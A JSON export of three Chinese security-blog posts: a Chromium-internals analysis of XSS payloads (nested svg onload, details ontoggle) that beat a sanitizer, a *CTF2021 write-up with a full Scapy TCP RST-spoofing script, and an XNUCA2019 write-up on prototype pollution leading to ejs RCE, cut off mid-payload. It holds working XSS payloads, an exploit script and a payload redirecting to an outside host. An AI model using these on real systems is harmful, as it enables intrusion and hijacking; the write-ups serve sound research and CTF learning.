[{"content":" 文章首发于安全客： https://www.anquanke.com/post/id/250538\n 前段时间P牛在他的星球发了一个XSS的小挑战（关于挑战的更多细节和解法见P牛的博客或者星球），我用的是DOM clobbering的方式完成。事后P牛给出了另一个trick，我看不懂但大受震撼，所以本文就来探讨一下这个trick的原理。\n以下测试的步骤都是Win10 \u0026amp; Chrome 最新版(92.0.4515.131) 下进行的；作者水平有限，如有错漏，还请各位师傅指正。\n挑战 小挑战的代码如下\n\u0026lt;script\u0026gt; const data = decodeURIComponent(location.hash.substr(1));; const root = document.createElement(\u0026#39;div\u0026#39;); root.innerHTML = data; // 这里模拟了XSS过滤的过程，方法是移除所有属性，sanitizer  for (let el of root.querySelectorAll(\u0026#39;*\u0026#39;)) { let attrs = []; for (let attr of el.attributes) { attrs.push(attr.name); } for (let name of attrs) { el.removeAttribute(name); } }\tdocument.body.appendChild(root); \u0026lt;/script\u0026gt; 可以看到这是个明显的DOM XSS，用户的输入会构成一个新div元素的子结点，但在插入body之前会被移除所有的属性。\n解法 这里有两种解法，一种是绕过过滤的代码，另一种则是在过滤前就执行的代码\n失败解法 有一些常见的payload在这个挑战里是无法成功，例如\u0026lt;img src=x onerror=alert(1)\u0026gt;，原因也很明显，onerror在触发前被过滤掉了。\n绕过过滤 绕过过滤主要是为了使得Payload里面的属性不被清除，最终触发事件执行JS。具体做法正是DOM clobbering，但不是本文重点就不展开了，感兴趣的师傅可以看下Zedd师傅的文章，P牛的文章也有其他Payload，这里给出一个我的解法以供参考：\n\u0026lt;form tabindex=1 onfocus=\u0026#34;alert(1);this.removeAttribute(\u0026#39;onfocus\u0026#39;);\u0026#34; autofocus=true\u0026gt; \u0026lt;img id=attributes\u0026gt;\u0026lt;img id=attributes name=z\u0026gt;\u0026lt;/form\u0026gt; 过滤前执行代码 另一种正确解法就是\u0026lt;svg\u0026gt;\u0026lt;svg onload=alert(1)\u0026gt;。看起来平平无奇，但是它可以在过滤代码执行以前，提前执行恶意代码。那为什么这个payload可以，上面img标签的payload却不能执行代码？而且如果只有单独一个svg标签也是不能正常执行的，像是\u0026lt;svg onload=alert(1)\u0026gt;。为更好地理解这个问题，需要稍微了解一下浏览器的渲染过程。\nDOM树的构建 我们知道JS是通过DOM接口来操作文档的，而HTML文档也是用DOM树来表示。所以在浏览器的渲染过程中，我们最关注的就是DOM树是如何构建的。\n解析一份文档时，先由标记生成器做词法分析，将读入的字符转化为不同类型的Token，然后将Token传递给树构造器处理；接着标识识别器继续接收字符转换为Token，如此循环。实际上对于很多其他语言，词法分析全部完成后才会进行语法分析（树构造器完成的内容），但由于HTML的特殊性，树构造器工作的时候有可能会修改文档的内容，因此这个过程需要循环处理。\n\r\n（图源参考链接3）\n在树构建过程中，遇到不同的Token有不同的处理方式。具体的判断是在HTMLTreeBuilder::ProcessToken(AtomicHTMLToken* token)中进行的。AtomicHTMLToken是代表Token的数据结构，包含了确定Token类型的字段，确定Token名字的字段等等。Token类型共有7种，kStartTag代表开标签，kEndTag代表闭标签，kCharacter代表标签内的文本。所以一个\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;会被解析成3个不同种类的Token，分别是kStartTag、kCharacter和kEndTag。在处理Token的过程中，还有一个InsertionMode的概念，用于判断和辅助处理一些异常情况。\n在处理Token的时候，还会用到HTMLElementStack，一个栈的结构。当解析器遇到开标签时，会创建相应元素并附加到其父节点，然后将token和元素构成的Item压入该栈。遇到一个闭标签的时候，就会一直弹出栈直到遇到对应元素构成的item为止，这也是一个处理文档异常的办法。比如\u0026lt;div\u0026gt;\u0026lt;p\u0026gt;1\u0026lt;/div\u0026gt;会被浏览器正确识别成\u0026lt;div\u0026gt;\u0026lt;p\u0026gt;1\u0026lt;/p\u0026gt;\u0026lt;/div\u0026gt;正是借助了栈的能力。\n而当处理script的闭标签时，除了弹出相应item，还会暂停当前的DOM树构建，进入JS的执行环境。换句话说，在文档中的script标签会阻塞DOM的构造。JS环境里对DOM操作又会导致回流，对DOM树构造造成额外影响。\nsvg标签 了解完上述内容后，回过头来看是什么导致了svg的成功，img的失败。\nimg失败原因 先来找一下失败案例的原因，看看是在哪里触发了img payload中的事件代码。将过滤的代码注释以后，注入payload并打断点调试一下。\n\r\n可以发现即使代码已经执行到最后一步，但在没有退出JS环境以前依然还没有弹窗。\n\r\n此时再点击单步调试就会来到我们的代码的执行环境了。此外，这里还有一个细节就是appendChild被注释并不影响代码的执行，证明即使img元素没有被添加到DOM树也不影响相关资源的加载和事件的触发。\n那么很明显，alert(1)是在页面上script标签中的代码全部执行完毕以后才被调用的。这里涉及到浏览器渲染的另外一部分内容： 在DOM树构建完成以后，就会触发DOMContentLoaded事件，接着加载脚本、图片等外部文件，全部加载完成之后触发load事件。\n同时，上文已经提到了，页面的JS执行是会阻塞DOM树构建的。所以总的来说，在script标签内的JS执行完毕以后，DOM树才会构建完成，接着才会加载图片，然后发现加载内容出错才会触发error事件。\n可以在页面上添加以下代码来测试这一点。\nwindow.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, (event) =\u0026gt; { console.log(\u0026#39;DOMContentLoaded\u0026#39;) }); window.addEventListener(\u0026#34;load\u0026#34;, (event) =\u0026gt; { console.log(\u0026#39;load\u0026#39;) }); 测试结果：\n\r\n那么失败的原因也很明显了，在DOM树构建以前，img的属性已经被sanitizer清除了，自然也不可能执行事件代码了。\nsvg成功原因 继续用断点调试svg payload为何成功。\n在root.innerHtml = data断下来后，点击单步调试。\n\r\n神奇的事情发生了，直接弹出了窗口，点击确定以后，调试器才会走到下一行代码。而且，这个地方如果只有一个\u0026lt;svg onload=alert(1)\u0026gt;，那么结果将同img一样，直到script标签结束以后才能执行相关的代码，这样的代码放到挑战里也将失败（测试单个svg时要注意，不能像img一样注释掉appendChild那一行）。那为什么多了一个svg套嵌就可以提前执行呢？带着这个疑问，我们来看一下浏览器是怎么处理的。\n触发流程 上文提到了一个叫HTMLElementStack的结构用来帮助构建DOM树，它有多个出栈函数。其中，除了PopAll以外，大部分出栈函数最终会调用到PopCommon函数。这两个函数代码如下：\nvoid HTMLElementStack::PopAll() { root_node_ = nullptr; head_element_ = nullptr; body_element_ = nullptr; stack_depth_ = 0; while (top_) { Node\u0026amp; node = *TopNode(); auto* element = DynamicTo\u0026lt;Element\u0026gt;(node); if (element) { element-\u0026gt;FinishParsingChildren(); if (auto* select = DynamicTo\u0026lt;HTMLSelectElement\u0026gt;(node)) select-\u0026gt;SetBlocksFormSubmission(true); } top_ = top_-\u0026gt;ReleaseNext(); } } void HTMLElementStack::PopCommon() { DCHECK(!TopStackItem()-\u0026gt;HasTagName(html_names::kHTMLTag)); DCHECK(!TopStackItem()-\u0026gt;HasTagName(html_names::kHeadTag) || !head_element_); DCHECK(!TopStackItem()-\u0026gt;HasTagName(html_names::kBodyTag) || !body_element_); Top()-\u0026gt;FinishParsingChildren(); top_ = top_-\u0026gt;ReleaseNext(); stack_depth_--; } 当我们没有正确闭合标签的时候，如\u0026lt;svg\u0026gt;\u0026lt;svg\u0026gt;，就可能调用到PopAll来清理；而正确闭合的标签就可能调用到其他出栈函数并调用到PopCommon。这两个函数有一个共同点，都会调用栈中元素的FinishParsingChildren函数。这个函数用于处理子节点解析完毕以后的工作。因此，我们可以查看svg标签对应的元素类的这个函数。\nvoid SVGSVGElement::FinishParsingChildren() { SVGGraphicsElement::FinishParsingChildren(); // The outermost SVGSVGElement SVGLoad event is fired through  // LocalDOMWindow::dispatchWindowLoadEvent.  if (IsOutermostSVGSVGElement()) return; // finishParsingChildren() is called when the close tag is reached for an  // element (e.g. \u0026lt;/svg\u0026gt;) we send SVGLoad events here if we can, otherwise  // they\u0026#39;ll be sent when any required loads finish  SendSVGLoadEventIfPossible(); } 这里有一个非常明显的判断IsOutermostSVGSVGElement，如果是最外层的svg则直接返回。注释也告诉我们了，最外层svg的load事件由LocalDOMWindow::dispatchWindowLoadEvent触发；而其他svg的load事件则在达到结束标记的时候触发。所以我们跟进SendSVGLoadEventIfPossible进一步查看。\nbool SVGElement::SendSVGLoadEventIfPossible() { if (!HaveLoadedRequiredResources()) return false; if ((IsStructurallyExternal() || IsA\u0026lt;SVGSVGElement\u0026gt;(*this)) \u0026amp;\u0026amp; HasLoadListener(this)) DispatchEvent(*Event::Create(event_type_names::kLoad)); return true; } 这个函数是继承自父类SVGElement的，可以看到代码中的DispatchEvent(*Event::Create(event_type_names::kLoad));确实触发了load事件，而前面的判断只要满足是svg元素以及对load事件编写了相关代码即可，也就是说在这里执行了我们写的onload=alert(1)的代码。\n实验 我们可以将过滤的代码注释，并添加相关代码来验证这个事件的触发时间。\nwindow.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, (event) =\u0026gt; { console.log(\u0026#39;DOMContentLoaded\u0026#39;) }); window.addEventListener(\u0026#34;load\u0026#34;, (event) =\u0026gt; { console.log(\u0026#39;load\u0026#39;) }); 同时，我们将注入代码也再套嵌一层\u0026lt;svg onload=console.log(\u0026quot;svg0\u0026quot;)\u0026gt;\u0026lt;svg onload=console.log(\u0026quot;svg1\u0026quot;)\u0026gt;\u0026lt;svg onload=console.log(\u0026quot;svg2\u0026quot;)\u0026gt;\n\r\n可以看到结果不出所料，最内层的svg先触发，然后再到下一层，而且是在DOM树构建完成以前就触发了相关事件；最外层的svg则得等到DOM树构建完成才能触发。\n小结 img和其他payload的失败原因在于sanitizer执行的时间早于事件代码的执行时间，sanitizer将恶意代码清除了。\n套嵌的svg之所以成功，是因为当页面为root.innerHtml赋值的时候浏览器进入DOM树构建过程；在这个过程中会触发非最外层svg标签的load事件，最终成功执行代码。所以，sanitizer执行的时间点在这之后，无法影响我们的payload。\ndetails标签 在P牛的文章里还简单提到了一个跟svg标签类似的，可以在Tui Editor里使用的payload，也就是\u0026lt;details open ontoggle=alert(1)\u0026gt;；但我用小挑战的代码进行测试的时候却发现并不可行。所以，这里也值得探讨一下。\n事件触发流程 首先触发代码的点是在DispatchPendingEvent函数里\nvoid HTMLDetailsElement::DispatchPendingEvent( const AttributeModificationReason reason) { if (reason == AttributeModificationReason::kByParser) GetDocument().SetToggleDuringParsing(true); DispatchEvent(*Event::Create(event_type_names::kToggle)); if (reason == AttributeModificationReason::kByParser) GetDocument().SetToggleDuringParsing(false); } 而这个函数是在ParseAttribute被调用的\nvoid HTMLDetailsElement::ParseAttribute( const AttributeModificationParams\u0026amp; params) { if (params.name == html_names::kOpenAttr) { bool old_value = is_open_; is_open_ = !params.new_value.IsNull(); if (is_open_ == old_value) return; // Dispatch toggle event asynchronously.  pending_event_ = PostCancellableTask( *GetDocument().GetTaskRunner(TaskType::kDOMManipulation), FROM_HERE, WTF::Bind(\u0026amp;HTMLDetailsElement::DispatchPendingEvent, WrapPersistent(this), params.reason)); .... return; } HTMLElement::ParseAttribute(params); } ParseAttribute正是在解析文档处理标签属性的时候被调用的。注释也写到了，分发toggle事件的操作是异步的。可以看到下面的代码是通过PostCancellableTask来进行回调触发的，并且传递了一个TaskRunner。\nTaskHandle PostCancellableTask(base::SequencedTaskRunner\u0026amp; task_runner, const base::Location\u0026amp; location, base::OnceClosure task) { DCHECK(task_runner.RunsTasksInCurrentSequence()); scoped_refptr\u0026lt;TaskHandle::Runner\u0026gt; runner = base::AdoptRef(new TaskHandle::Runner(std::move(task))); task_runner.PostTask(location, WTF::Bind(\u0026amp;TaskHandle::Runner::Run, runner-\u0026gt;AsWeakPtr(), TaskHandle(runner))); return TaskHandle(runner); } 跟进PostCancellableTask的代码则会发现，回调函数（被封装成task）正是通过传递的TaskRunner去派遣执行。\n清楚调用流程以后，就可以思考，为什么无法触发这个事件呢？最大的可能性，就是在任务交给TaskRunner以后又被取消了。因为是异步调用，而且PostCancellableTask这个函数名也暗示了这一点。\n实验验证 可以做一个实验来验证，修改小挑战代码，将sanitizer部分延时执行。\nconst data = decodeURIComponent(location.hash.substr(1));; const root = document.createElement(\u0026#39;div\u0026#39;); root.innerHTML = data; setTimeout( () =\u0026gt; { for (let el of root.querySelectorAll(\u0026#39;*\u0026#39;)) { let attrs = []; for (let attr of el.attributes) { attrs.push(attr.name); } for (let name of attrs) { el.removeAttribute(name); } }\tdocument.body.appendChild(root) } , 2000) 代码修改前：\n\r\n执行失败。\n代码修改后：\n\r\n可以看到，确实成功执行了事件代码。\n那么回过头来想一下，为什么P牛测试Tui的时候直接成功，我却在修改前的挑战代码中失败？看一下Tui的处理这部分内容的相关代码。https://github.com/nhn/tui.editor/blob/48a01f5/apps/editor/src/sanitizer/htmlSanitizer.ts\nexport function sanitizeHTML(html: string) { const root = document.createElement(\u0026#39;div\u0026#39;); if (isString(html)) { html = html.replace(reComment, \u0026#39;\u0026#39;).replace(reXSSOnload, \u0026#39;$1\u0026#39;); root.innerHTML = html; } removeUnnecessaryTags(root); leaveOnlyWhitelistAttribute(root); return finalizeHtml(root, true) as string; } sanitizeHTML函数是处理用户输入的部分。比起挑战的代码，这里多了正则过滤，移除黑名单标签(removeUnnecessaryTags)，不过不会移除所有标签而是留下了部分白名单标签(leaveOnlyWhitelistAttribute)。最神奇的地方来了，details标签也是黑名单的一员，这也是我一开始无法理解为何这个payload能成功执行的原因。但现在我们理清楚调用流程以后，可以有一个大胆的猜测：正是因为details在黑名单里，所以被移除以后其属性没有被直接修改，所以事件依然在队列中没有被取消。\n再进行一个实验来验证，对挑战的代码做一些修改，增加移除标签的代码。\nconst data = decodeURIComponent(location.hash.substr(1));; const root = document.createElement(\u0026#39;div\u0026#39;); root.innerHTML = data; let details = root.querySelector(\u0026#34;details\u0026#34;) root.removeChild(details) for (let el of root.querySelectorAll(\u0026#39;*\u0026#39;)) { let attrs = []; for (let attr of el.attributes) { attrs.push(attr.name); } for (let name of attrs) { el.removeAttribute(name); } }\t\r\n成功执行了代码！\n小结 所以我们可以得到结论，details标签的toggle事件是异步触发的，并且直接对details标签的移除不会清除原先通过属性设置的异步任务。\n思考 对于DOM XSS，我们是通过操作DOM来引入代码，但由于浏览器的限制，我们无法像这样root.innerHTML = \u0026quot;\u0026lt;script\u0026gt;..\u0026lt;/script\u0026gt;\u0026quot; 直接执行插入的代码，因此，一般需要通过事件触发。通过上面的例子，可以发现依据事件触发的时机能进一步区分DOM XSS：\n 立即型，操作DOM时触发。套嵌的svg可以实现 异步型，操作DOM后，异步触发。details可以实现 滞后型，操作DOM后，由其他代码触发。img等常见payload可以实现  从危害来看，明显是1\u0026gt;2\u0026gt;3，特别是1，可以直接无视后续的sanitizer操作。因此，师傅们可以研究浏览器的相关代码，通过这个方向来找到杀伤力更大的第一种或第二种类型的payload。\n参考链接  一次对 Tui Editor XSS 的挖掘与分析 从Chrome源码看JavaScript的执行（上） 浏览器的工作原理：新式网络浏览器幕后揭秘 浏览器内核原理\u0026ndash;Chromium Blink Html解析(2) 从Chrome源码看事件循环  ","date":"2021-08-23T00:00:00Z","permalink":"https://example.com/p/a-trick-in-dom-xss/","title":"探索DOM XSS一个trick的原理"},{"content":"*CTF2021里的一道Web题目oh-my-socket是关于TCP侧信道攻击的，个人感觉更像是杂项而不是传统的Web题，记录一下赛后复现的过程以及遇到的一些问题和解决思路。\n审计题目 主办方公开了题目源码以及相关WP在他们的github上面\nhttps://github.com/sixstars/starctf2021/tree/main/web-oh-my-socket\n可以发现起了3个容器，分别是webserver，client和server。并且我们拥有：\n webserver上的root权限RCE client里的任意文件读取  在启动的时候，client会绑定一个端口，然后通过tcp主动连接server的一个端口，然后两边互相等待，处于阻塞状态。只要连上了server的该端口，发送*ctf即可得到server的flag。\n所以问题就是断开client和server的链接。\n因为3个容器同属一个内网，所以我们控制的webserver可以伪装client或者server发送tcp包，因为原始TCP协议不会去验证MAC地址。只要我们向client或者server发送一个RST的TCP包那就可以断开他们的连接了，但是前提是sequence字段需要准确。\n所以本题预期解法的重点也就在于通过侧信道方式获取client中的sequence字段，这也是出题人设置了一个client的任意文件读取的意义。\n而在向client发送正确RST包以后，client就会close该链接，然后再向server发送一个rst包即可\n预期解 Linux中有一个计数器DelayedAckLost，当系统接收的数据包中的序列号小于预期的序列号时，则认为网络出了问题需要重传，所以这个计数器就加一，而且这个计数器是可以通过文件/proc/net/netstat或者其他的文件如proc/self/net/netstat读取到，所以我们可以通过这种办法来判断发送的序列号是否小于预期序列号，从而在(0, 2^32)的区间里推断出预期序列号。\n因此，采用二分法找出预期序列号即可进行后续攻击。\n另外在测试中可能会发现一个神奇的现象，就是有时采用2^32-1作为序列号的时候计数器居然加一了。这是因为TCP为解决序列号回绕问题，在判断序列号大小的时候不是直接seq1\u0026gt;seq2，而是\n/* * The next routines deal with comparing 32 bit unsigned ints * and worry about wraparound (automatic with unsigned arithmetic). */ static inline int before(__u32 seq1, __u32 seq2) { return (__s32)(seq1-seq2) \u0026lt; 0; } #define after(seq2, seq1) before(seq1, seq2) 如果2个无符号数seq1减去seq2的差值转换为有符号数后小于0，则证明seq1小于seq2。换句话说，当seq1 - seq2的值足够大，使得第一个bit为1时，那么就认为seq1小于seq2。\n这就会影响到我们通过DelayedAckLost来进行判断序列号大小，因为在这种判断逻辑下，系统会认为2^31+x 小于 y (y \u0026lt; x \u0026lt; 2^31) 。这就会导致，在我们的预期程序逻辑中，\n 当2^31+x为我们发送的seq1时，DelayedAckLost不正确的加一了 当y为我们发送的seq1时，DelayedAckLost没有正确加一。  但实际上我们采用二分查找法以后，很难出现2^31+x 与 y的比较，因为第一步比较就会将比较区间缩小到2^31之内了，不太可能出现这种横跨2^31的比较。\n获取到seq以后，即可发送rst包到client，此时client中的链接已被关闭。\n但是我们需要的是server上的链接关闭，所以我们伪造client向server发送一个ack包(seq值不正确)，根据TCP重传机制，server会返回一个ack包给到client，而client发现链接已经关闭，则会返回一个rst包（seq值为server发送的ack包的ack值），使得server上的链接也关闭。\n最后链接到server即可获取flag。\n附上EXP\nfrom scapy.all import * from socket import * import requests import time sess = requests.session() def sendRstPacket(seq): ip = IP(src=\u0026#34;172.21.0.2\u0026#34;, dst=\u0026#34;172.21.0.3\u0026#34;) tcp = TCP(sport=21587, dport=7775, flags=\u0026#34;R\u0026#34;, seq=seq) packet = ip / tcp return send(packet,verbose=0) def sendAckPacket(seq): ip = IP(src=\u0026#34;172.21.0.2\u0026#34;, dst=\u0026#34;172.21.0.3\u0026#34;) tcp = TCP(sport=21587, dport=7775, flags=\u0026#34;A\u0026#34;, seq=seq) packet = ip / tcp / \u0026#34;payload\u0026#34; return send(packet,verbose=0) def sendAckPacketToServer(seq): ip = IP(src=\u0026#34;172.21.0.3\u0026#34;, dst=\u0026#34;172.21.0.2\u0026#34;) tcp = TCP(sport=7775, dport=21587, flags=\u0026#34;A\u0026#34;, seq=seq) packet = ip / tcp / \u0026#34;payload\u0026#34; return send(packet,verbose=0) def getDelayedAckLost(): r = sess.get(\u0026#34;http://172.21.0.3:5000/file?name=/proc/1/net/netstat\u0026#34;) lines = r.text.split(\u0026#34;\\n\u0026#34;) lines[0] = lines[0].split(\u0026#34; \u0026#34;) lines[1] = lines[1].split(\u0026#34; \u0026#34;) netstat = {lines[0][i]:lines[1][i] for i in range(len(lines[0])) } return netstat[\u0026#39;DelayedACKLost\u0026#39;] def binarySearch(): min = 0 max = 2**32 -1 while abs(max - min) \u0026gt; 1: mid = (min + max) // 2 counter = getDelayedAckLost() sendAckPacket(mid) counter_new = getDelayedAckLost() if counter_new \u0026gt; counter: counter = counter_new min = mid else: max = mid if min == max or min == max-1: return min else: return None # 有时获取到的seq并非正确的值，所以多试几次 for i in range(5): try: seq = binarySearch() print(seq) # 当获取到的seq为0时。证明上一次获取的值为正确的，也就是已经断开链接，所以break if seq == 0: break for i in range(100): sendRstPacket(seq + i - 50) sendAckPacketToServer(seq) except: pass time.sleep(1) tcpCliSock = socket(AF_INET,SOCK_STREAM) HOST = \u0026#39;172.21.0.2\u0026#39; PORT = 21587 ADDR = (HOST,PORT) tcpCliSock.settimeout(5) try: tcpCliSock.connect(ADDR) tcpCliSock.send(b\u0026#34;*ctf\u0026#34;) data1 = tcpCliSock.recv(1024) print(data1.decode()) tcpCliSock.close() except: print(\u0026#34;error\u0026#34;) 题目非预期  一开始题目设置webserver为privileged:true导致docker逃逸，因此可以直接读到宿主机文件中另一个容器server中的flag。 虽然client设置了depends_on，但这只能保证client会在server启动后再启动，无法保证在server.py执行以后再执行client.py。因此，依然有可能出现client中发起连接时server还未监听端口的情况，而client只发起一次connect，所以这会导致双方未建立链接，没有进入阻塞，这个时候直接连接server即可getflag。 因为题目不是每个队伍一个环境，所以如果一直在connect server，那么有可能在别的队伍解除阻塞以后先人一步连上了server。。  参考链接   https://blog.frankli.site/2021/01/18/*CTF-2021-Web/#oh-my-socket\n  https://github.com/ateamjkr/posts/blob/30ee3cc41d9035409281913df4b881a08f4ceac7/ctf/starctf-oh-my-socket-solution.md\n  https://github.com/sixstars/starctf2021/blob/main/web-oh-my-socket/oh-my-socket-ZH.md\n  https://docs.docker.com/compose/startup-order/\n  ","date":"2021-02-08T20:25:08Z","permalink":"https://example.com/p/starctf2021-oh-my-socket/","title":"*ctf2021 oh-my-socket 复现"},{"content":" 文章首发于先知社区：https://xz.aliyun.com/t/6113\n 前言 这次XNUCA2019的WEB题四道只有两道被解出，其中这道Hardjs是做出人数较少的一道，还是比较有意思的，所以在此分享一下解题思路。\n初步分析 题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是server.js和robot.js。\n先分析server.js。\n可以发现这个服务器是nodejs，并且用了express这个框架，模板渲染引擎则用了ejs。\n审计一下代码可以看到有以下的路由：\n / 首页 /static 静态文件 /sandbox 显示用户HTML数据用的沙盒 /login 登陆 /register 注册 /get json接口 获取数据库中保存的数据 /add 用户添加数据的接口  除了/static，/login和/register以外，所以路由在访问的时候都会经过一个auth函数进行身份验证\n因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。\n另外在初始化的时候有这么一句\napp.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json()) 所以我们可以通过json格式传递参数到服务端\n发现问题 在/get中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下\nvar sql = \u0026#34;select `id`,`dom` from `html` where userid=? \u0026#34;; var raws = await query(sql,[userid]); var doms = {} var ret = new Array(); for(var i=0;i\u0026lt;raws.length ;i++){ lodash.defaultsDeep(doms,JSON.parse( raws[i].dom )); var sql = \u0026#34;delete from `html` where id = ?\u0026#34;; var result = await query(sql,raws[i].id); } 其中的lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));恰好是前段时间公布的CVE-2019-10744 的攻击对象，再看一下版本刚好是4.17.11，并没有修复这个漏洞。所以我们可以利用这个漏洞进行原型链污染。\n###.1 原型链污染\n这里简单介绍一下原型链污染(prototype pollution)\nJavascript里每个类都有一个prototype的属性，用来绑定所有对象都会有变量与函数，对象的构造函数又指向类本身，同时对象的__proto__属性也指向类的prototype。因此，有以下关系：\n\r\n并且，类的继承是通过原型链传递的，一个类的prototype属性指向其继承的类的一个对象。所以一个类的prototype.__proto__等于其父类的prototype，当然也等于该类对象的__proto__.__proto__属性。\n我们获取某个对象的某个成员时，如果找不到，就会通过原型链一步步往上找，直到某个父类的原型为null为止。所以修改对象的某个父类的prototype的原型就可以通过原型链影响到跟此类有关的所有对象。\n\r\n当然，如果某个对象本身就拥有该成员，就不会往上找，所以利用这个漏洞的时候，我们需要做到的是找到某个成员被判断是否存在并使用的代码。\n###.2 发现利用点\n在server.js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分\nfunction auth(req,res,next){ // var session = req.session;  if(!req.session.login || !req.session.userid ){ res.redirect(302,\u0026#34;/login\u0026#34;); } else{ next(); } } 在我们没有登陆以前，req.seesion.login和req.session.userid是undefined的，而session对象的父类肯定包含了Object，所以我们只要修改Object中的这部分代码就可以绕过登陆，以admin身份访问网页。\n尝试XSS攻击 知道了上述的利用点以后，回去审计robot.py可以发现，flag值是存在环境变量中的，并且是admin的密码，robot会打开本地页面的首页/(原先是会自动跳转到/login，当然我们现在可以bypass掉这个跳转)，然后robot会根据form的name填写用户名和密码，并点击submit按钮。\n因为首页会自动加载我们保存的html数据，所以这个时候我的思路是可以构造一个form，但是提交地址是自己的服务器，这样就可以接受到来自bot的flag了。\n再加上robot.py中的以下细节，我认为从前端下手应该是出题人预留的预期解之一。``\nchrome_options.add_argument(\u0026#39;--disable-xss-auditor\u0026#39;) ... print(client.current_url) 所以审计前端的app.js\n发现所有我们保存在数据库的数据是动态加载到一个有sanbox标签的iframe中，这就导致即使我们可以写一个表单，也无法被提交，我们的数据中的js是不会被执行的。\n不过恰巧的是app.js使用的Jquery前段时间也有一个原型链污染漏洞被曝出，而且在页面中也使用到了\nfor(var i=0 ;i\u0026lt;datas.length; i++){ $.extend(true,allNode,datas[i]) } 具体的CVE号是CVE-2019-11358，利用方法类似上文的漏洞。\n如果找到利用链应该是可以成功攻击的，不过遗憾的是本人水平有限，没能在比赛的时候找到攻击方法。\n投稿的时候发现官方WP出了，并且给出了这种解法的攻击payload，供大家参考\n{\u0026#34;type\u0026#34;:\u0026#34;test\u0026#34;,\u0026#34;content\u0026#34;:{\u0026#34;__proto__\u0026#34;: {\u0026#34;logger\u0026#34;: \u0026#34;\u0026lt;script\u0026gt;window.location=\u0026#39;http://wonderkun.cc/hack.html\u0026#39;\u0026lt;/script\u0026gt;\u0026#34;}}} 挖掘后端攻击方法 因为前端攻击失败，就希望通过后端找到可利用的点。\n审计server.js的时候可以看到，返回页面是通过res.render(xxx)渲染的，所以尝试从这里下手，跟进模板渲染寻找符合我们上述条件的利用点。\n因为代码较多，所以以下分析省略部分无关代码。\n通过跟进/login的res.render\nres.render = function render(view, options, callback) { var app = this.req.app; var done = callback; var opts = options || {}; var req = this.req; var self = this; .... // render  app.render(view, opts, done); }; 可以发现来到了response.js的中对res.render的定义，并且调用了app.render，同时，将进行了参数配置传递。继续跟进，来到application.js\napp.render = function render(name, options, callback) { var cache = this.cache; var done = callback; var engines = this.engines; var opts = options; var renderOptions = {}; var view; .... // render  tryRender(view, renderOptions, done); }; 发现调用了tryRender，并继续传递配置，我们继续跟进\nfunction tryRender(view, options, callback) { try { view.render(options, callback); } catch (err) { callback(err); } } 调用了view.render，继续跟进就来到了view.js\nView.prototype.render = function render(options, callback) { debug(\u0026#39;render \u0026#34;%s\u0026#34;\u0026#39;, this.path); this.engine(this.path, options, callback); }; 调用了engine，终于来到了模板渲染引擎ejs.js中。\nexports.renderFile = function () { var args = Array.prototype.slice.call(arguments); var filename = args.shift(); var cb; var opts = {filename: filename}; var data; var viewOpts; ... return tryHandleCache(opts, data, cb); }; 发现跳到renderFile函数，并且又调用了tryHandleCache，我这里省略了opts传递的代码。\nfunction tryHandleCache(options, data, cb) { var result; ... result = handleCache(options)(data); ... } 这里可以看到handleCache返回了一个函数，并且将data传入进行执行，而这个result就是最后生成的页面了，这个时候可以感觉到，有RCE的可能性。继续跟进。\nfunction handleCache(options, template) { var func; var filename = options.filename; var hasTemplate = arguments.length \u0026gt; 1; ... func = exports.compile(template, options); if (options.cache) { exports.cache.set(filename, func); } return func; } 跟进生成func的compile\nexports.compile = function compile(template, opts) { var templ; ... templ = new Template(template, opts); return templ.compile(); }; 发现新建了一个Template对象并执行其成员方法得到返回的func。我们跟进其成员方法compile查看。\ncompile: function () { var src; var fn; var opts = this.opts; var prepended = \u0026#39;\u0026#39;; var appended = \u0026#39;\u0026#39;; var escapeFn = opts.escapeFunction; var ctor; if (!this.source) { this.generateSource(); prepended += \u0026#39; var __output = [], __append = __output.push.bind(__output);\u0026#39; + \u0026#39;\\n\u0026#39;; if (opts.outputFunctionName) { prepended += \u0026#39; var \u0026#39; + opts.outputFunctionName + \u0026#39; = __append;\u0026#39; + \u0026#39;\\n\u0026#39;; } if (opts._with !== false) { prepended += \u0026#39; with (\u0026#39; + opts.localsName + \u0026#39; || {}) {\u0026#39; + \u0026#39;\\n\u0026#39;; appended += \u0026#39; }\u0026#39; + \u0026#39;\\n\u0026#39;; } appended += \u0026#39; return __output.join(\u0026#34;\u0026#34;);\u0026#39; + \u0026#39;\\n\u0026#39;; this.source = prepended + this.source + appended; } ... src = this.source; ... try { if (opts.async) { // Have to use generated function for this, since in envs without support,  // it breaks in parsing  try { ctor = (new Function(\u0026#39;return (async function(){}).constructor;\u0026#39;))(); } catch(e) { if (e instanceof SyntaxError) { throw new Error(\u0026#39;This environment does not support async/await\u0026#39;); } else { throw e; } } } else { ctor = Function; } fn = new ctor(opts.localsName + \u0026#39;, escapeFn, include, rethrow\u0026#39;, src); } ... // Return a callable function which will execute the function  // created by the source-code, with the passed data as locals  // Adds a local `include` function which allows full recursive include  var returnedFn = function (data) { var include = function (path, includeData) { var d = utils.shallowCopy({}, data); if (includeData) { d = utils.shallowCopy(d, includeData); } return includeFile(path, opts)(d); }; return fn.apply(opts.context, [data || {}, escapeFn, include, rethrow]); }; returnedFn.dependencies = this.dependencies; return returnedFn; }, 这段代码中\nif (opts.outputFunctionName) { prepended += \u0026#39; var \u0026#39; + opts.outputFunctionName + \u0026#39; = __append;\u0026#39; + \u0026#39;\\n\u0026#39;; } 就是我们一直寻找的东西，这个对象会与其他生成的模板字符串一起拼接到this.source，然后传递给src，接着是fn，然后以returnedFn返回并最后被执行。而一路跟进的时候可以发现，并没有outputFunctionName的身影，所以只要给Object的prototype加上这个成员，我们就可以实现从原型链污染到RCE的攻击过程了！\n成功攻击 可以发现process是可以访问到的，所以我们可以用来反弹shell\n\r\n最后的payload如下\n{ \u0026#34;content\u0026#34;: { \u0026#34;constructor\u0026#34;: { \u0026#34;prototype\u0026#34;: { 